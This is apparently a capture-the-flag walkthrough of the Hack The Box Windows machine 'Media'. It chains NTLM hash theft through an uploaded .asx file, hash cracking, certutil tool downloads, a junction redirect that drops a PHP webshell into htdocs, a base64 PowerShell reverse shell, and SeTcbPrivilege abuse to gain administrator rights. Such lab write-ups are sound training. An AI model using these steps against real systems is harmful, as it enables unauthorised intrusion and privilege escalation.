---
layout: post
title: "Media"
date: 2026-08-19
tags: [HTB, Windows, Apache, PHP, NTLM, PrivEsc]
---

We start our enumeration with an Nmap scan. Since we have no credentials, the HTTP service is the most interesting attack surface to investigate.

```text
# Nmap 7.99 scan initiated Tue Aug 11 04:27:00 2026 as: /usr/lib/nmap/nmap -p- -sV -sC --min-rate 1000 -T4 -oA Media 10.129.234.67
Nmap scan report for 10.129.234.67
Host is up (0.13s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MEDIA
|_ssl-date: 2026-08-11T08:29:13+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Browsing to the website, we find an upload function that looks interesting. A test upload returns a message indicating that someone on the team will review the submission.

This suggests that an employee or automated process may access the uploaded files, making NTLM theft worth testing.

We can use the `ntlm_theft` tool by Greenwolf to generate a malicious file compatible with Windows Media Player and see if we can capture a NetNTLMv2 hash.

```bash
python3 ntlm_theft.py -g asx -s 10.10.14.106 -f /home/kali/Boxes/Media/intro
```

We start Responder on our attack machine:

```bash
sudo responder -I tun0
```

After uploading the malicious file, we receive a NetNTLMv2 hash from the server, which we can attempt to crack with Hashcat.

```text
[SMB] NTLMv2-SSP Client   : 10.129.45.91
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:17ca7a482df5179e:1DF02EEF45C42F <redacted>
```

```powershell
PS C:\hashcat-7.1.2> .\hashcat.exe -m 5600 .\media.hash .\rockyou.txt

enox:<redacted>
```

After cracking the hash, we can use the SSH service discovered earlier to obtain a shell as `enox` and retrieve the user flag.

We'll start our Python web server on our attack box and transfer over winPEAS to see if we can find an interesting vector for privilege escalation:

```powershell
certutil -urlcache -split -f http://10.10.14.106:8001/winPEAS.exe C:\Users\enox\Desktop\winPEAS.exe
```

winPEAS doesn't directly find any low-hanging fruits.

## Upload directory

Enumerating the `index.php` for the upload function we find some interesting code:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
    $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
    $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
    $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

    $folderName = md5($firstname . $lastname . $email);
    $targetDir = $uploadDir . $folderName . '/';

    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    $originalFilename = $_FILES["fileToUpload"]["name"];
    $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);
    $targetFile = $targetDir . $sanitizedFilename;

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
        echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

        $todoFile = $uploadDir . 'todo.txt';
        $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";
        file_put_contents($todoFile, $todoContent, FILE_APPEND);
    }
}
```

The directory name is predictable because it is simply the MD5 hash of the supplied first name, last name and email.

```php
php > $fn = "media";
php > $ln = "media";
php > $mail = "media@htb.com";
php > echo md5($fn . $ln . $mail);
6155a271368fa14d3dd084f08bf3daca
```

```text
Directory of C:\Windows\Tasks\Uploads

08/19/2026  01:29 AM    <DIR>          .
10/02/2023  11:04 AM    <DIR>          ..
08/19/2026  01:29 AM    <DIR>          6155a271368fa14d3dd084f08bf3daca
08/19/2026  01:28 AM    <DIR>          d41d8cd98f00b204e9800998ecf8427e
```

Since the web server creates these files, they are owned by the account running the web server, which in this case is `NT AUTHORITY\LOCAL SERVICE`. We can also see that the upload directory grants Full Control to Everyone.

```text
enox@MEDIA C:\Windows\Tasks\Uploads>icacls *
6155a271368fa14d3dd084f08bf3daca Everyone:(I)(OI)(CI)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 NT AUTHORITY\LOCAL SERVICE:(I)(F)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)

d41d8cd98f00b204e9800998ecf8427e Everyone:(I)(OI)(CI)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 NT AUTHORITY\LOCAL SERVICE:(I)(F)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)

todo.txt Everyone:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         MEDIA\enox:(I)(F)
```

```powershell
PS C:\Windows\Tasks\Uploads\6155a271368fa14d3dd084f08bf3daca> get-acl * | select owner

Owner
-----
NT AUTHORITY\LOCAL SERVICE
```

Since the upload directory grants Full Control to Everyone, we can try redirecting one of the upload paths to Apache's `htdocs` directory. The application writes uploaded files directly to the generated path, so we can replace that path with a junction pointing to `C:\xampp\htdocs`.

We can test this by generating a new directory name and creating a junction at that location. The directory name is derived from `firstname + lastname + email`, so we can choose arbitrary values:

**Firstname:** `foo`  
**Lastname:** `bar`  
**Email:** `foo@bar.com`

```bash
echo -n 'foobarfoo@bar.com' | md5sum
beefb40925db9ee54560bb7f90d37d0d  -
```

Creating the junction:

```powershell
PS C:\windows\tasks\uploads> New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d" -Target "C:\xampp\htdocs"
```

Or via CMD:

```cmd
mklink /J C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d C:\xampp\htdocs
```

We can now upload a PHP webshell through the application. Because the upload path resolves through our junction, the file is written to `C:\xampp\htdocs` and becomes accessible through the web server.

```bash
curl http://media.htb/shell.php?cmd=whoami
```

```text
nt authority\local service
```

## Privilege escalation

We can now use the webshell to obtain a PowerShell reverse shell.

```text
nc -lnvp 4445
```

```bash
curl http://media.htb/shell.php?cmd=powershell%20<base64>
```

```text
nt authority\local service
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege      Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

`SeTcbPrivilege` lets a process perform security-sensitive token operations. We can leverage it using the following PoC: [SeTcbPrivilege-Abuse](https://github.com/b4lisong/SeTcbPrivilege-Abuse).

Downloading the PoC from our web server:

```powershell
certutil -urlcache -split -f http://10.10.14.106:8001/TcbElevation-x64.exe C:\xampp\htdocs\TcbElevation.exe
```

`TcbElevation.exe` supports spawning a process directly under the elevated token, which could be used to launch an NT AUTHORITY reverse shell. Instead, we'll use it to add `enox` to the local Administrators group:

```powershell
.\TcbElevation.exe elevate 'net localgroup Administrators enox /add'
```

```text
PS C:\xampp\htdocs> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

We can now restart our SSH session as `enox` so that the new Administrators group membership takes effect.

```text
enox@MEDIA C:\Users\Administrator\Desktop>type root.txt
a9a7182f125<redacted>
```
